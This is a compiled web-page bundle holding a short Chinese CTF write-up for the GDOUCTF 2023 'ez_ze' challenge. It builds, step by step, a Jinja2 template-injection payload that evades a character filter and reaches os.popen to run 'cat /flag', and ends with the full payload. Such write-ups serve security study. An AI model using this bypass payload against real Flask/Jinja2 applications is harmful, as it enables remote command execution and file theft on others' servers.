import{_ as a,r as p,o as t,c as o,a as n,b as e,d as c,e as l}from"./app-d4f08b22.js";const u={},i=n("p",null,"#SSTI",-1),r={href:"https://www.cnblogs.com/bl0ck/articles/17595237.html",target:"_blank",rel:"noopener noreferrer"},k=l(`<p>被过滤：<code>{{</code> <code>}}</code> <code>popen</code> <code>_</code> <code>[</code> <code>]</code> <code>os</code> <code>getitem</code> <code>.</code> <code>&quot;</code> 按照链接里的解法</p><p>payload 原型</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token punctuation">{</span><span class="token punctuation">{</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">&#39;__globals__&#39;</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">&#39;__getitem__&#39;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">&#39;os&#39;</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">&#39;popen&#39;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">&#39;cat /flag&#39;</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">&#39;read&#39;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>先获取下划线和空格</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">print</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>第十九个是下划线,这里要用 pop 来获取下划线。</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> pop<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>pop<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> xhx<span class="token operator">=</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> kong<span class="token operator">=</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>获取反斜线，<strong>lipsum</strong>里面没有斜杠，在<strong>config</strong>里面发现有斜杠有点多可以写可脚本遍历一下</p><p>第 239 个是斜杠</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> pop<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>pop<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> re<span class="token operator">=</span><span class="token punctuation">(</span>config<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">239</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>然后是获取 <code>__globals__</code></p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> <span class="token builtin">globals</span><span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>用同样的方式获取 <code>__getitem__</code></p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> geti<span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>get<span class="token operator">=</span>a<span class="token punctuation">,</span>item<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其他的就是依葫芦画瓢。</p><p>完整的 payload 就是</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> pop<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>pop<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> kong<span class="token operator">=</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> xhx<span class="token operator">=</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> re<span class="token operator">=</span><span class="token punctuation">(</span>config<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">239</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> <span class="token builtin">globals</span><span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> geti<span class="token operator">=</span><span class="token punctuation">(</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>get<span class="token operator">=</span>a<span class="token punctuation">,</span>item<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>xhx<span class="token punctuation">,</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> o<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>o<span class="token operator">=</span>a<span class="token punctuation">,</span>s<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> po<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>pop<span class="token operator">=</span>a<span class="token punctuation">,</span>en<span class="token operator">=</span>b<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> cmd<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>cat<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>kong<span class="token punctuation">,</span>re<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>flag<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token builtin">set</span> read<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>read<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">print</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>geti<span class="token punctuation">)</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>po<span class="token punctuation">)</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>read<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,17);function d(b,m){const s=p("ExternalLinkIcon");return t(),o("div",null,[i,n("p",null,[n("a",r,[e("[GDOUCTF 2023]ez_ze - bl0ck - 博客园 (cnblogs.com)"),c(s)])]),k])}const v=a(u,[["render",d],["__file","ez_ze.html.vue"]]);export{v as default};
